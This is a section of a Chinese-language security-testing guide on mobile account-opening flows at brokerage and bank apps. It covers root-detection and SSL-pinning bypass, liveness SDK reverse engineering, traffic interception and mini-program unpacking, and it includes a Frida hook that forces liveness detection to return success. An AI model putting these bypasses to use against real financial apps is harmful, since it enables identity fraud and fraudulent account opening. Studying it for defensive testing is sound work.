## 6. 移动端开户安全测试

### 6.1 券商/银行APP安全测试

```bash
# === 券商APP开户安全测试 ===

# 1. APP完整性检测绕过
# 检测: 是否运行在Root/越狱设备、是否被重打包
# 绕过: Magisk Hide / Shamiko(隐藏Root)
#       Frida Gadget(注入绕过包名检测)

# 2. SSL Pinning绕过
# 券商APP通常有证书锁定
frida -U -l ssl_pinning_bypass.js -f com.target.brokerage

# 3. 活体检测SDK逆向
# 分析SDK: 商汤/旷视/百度/腾讯/阿里活体检测SDK
# 提取: 活体检测参数、动作指令集、分数阈值
jadx -d output_dir target_brokerage.apk

# 4. 开户流程API分析
# 抓包分析开户全流程
mitmproxy -p 8080 --mode transparent
# 关注: OCR上传接口、人脸识别接口、视频见证接口、银行卡验证接口

# 5. 重放攻击测试
# 使用同一套证件信息重复开户
# 测试: 是否校验身份证号唯一性
# 测试: 是否校验人脸与历史人脸匹配
```

### 6.2 Android/iOS端注入攻击

```javascript
// === Frida Hook: 拦截活体检测结果 ===

// Hook Android Camera API
Java.perform(function() {
    // Hook Camera.takePicture
    var Camera = Java.use("android.hardware.Camera");
    Camera.takePicture.implementation = function(shutter, raw, jpeg) {
        console.log("[*] Camera.takePicture called");
        // 可以在此处替换图片数据
        this.takePicture(shutter, raw, jpeg);
    };
    
    // Hook活体检测SDK回调
    var LivenessDetector = Java.use("com.sdk.liveness.LivenessDetector");
    LivenessDetector.onSuccess.implementation = function(result) {
        console.log("[*] Liveness detection SUCCESS intercepted");
        // 强制返回成功
        this.onSuccess(0.99); // 高置信度分数
    };
});

// Hook iOS AVCaptureSession
// 使用Objection
// objection -g com.target.brokerage explore
// ios hooking watch class AVCaptureSession
```

### 6.3 小程序开户安全

```bash
# === 微信小程序/支付宝小程序开户安全测试 ===

# 1. 小程序源码提取
# 微信小程序: 使用wxappUnpacker解包
node wuWxapkg.js target_brokerage_miniapp.wxapkg

# 2. 小程序API分析
# 提取: wx.login → wx.request → 后端API
# 关注: 小程序是否有独立的开户API(与APP不同)

# 3. 小程序环境检测绕过
# 小程序可以检测: 运行环境、微信版本、设备信息
# 绕过: 开发者工具模拟 + 修改User-Agent

# 4. 支付宝小程序安全
# 支付宝小程序有独立的身份验证体系
# 攻击面: 支付宝实名信息泄露、授权过度
# 测试: 跨小程序身份信息共享
```

---

